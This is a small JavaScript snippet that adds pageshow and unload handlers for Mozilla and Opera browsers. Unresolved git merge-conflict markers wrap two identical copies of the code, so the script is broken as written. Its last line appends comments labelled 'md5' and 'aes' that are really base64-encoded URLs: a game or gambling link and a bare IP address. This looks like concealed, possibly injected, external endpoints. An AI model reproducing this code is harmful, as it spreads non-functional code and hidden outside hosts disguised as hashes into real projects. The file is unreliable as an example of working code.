<<<<<<< HEAD
if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
=======
if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
>>>>>>> ff73aea5f9262a29bd0e003882adf9050b92a06b
})()/** md5:aHR0cDovL2dhbWV4ZC5maXJlMjMzMy5jb20vaG9tZS9hYz9hY3Rpb249L2hvbWUvZ2FtZS9hLzUxMDAwMDAvZy8yMDAxNzQvc3IvMQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/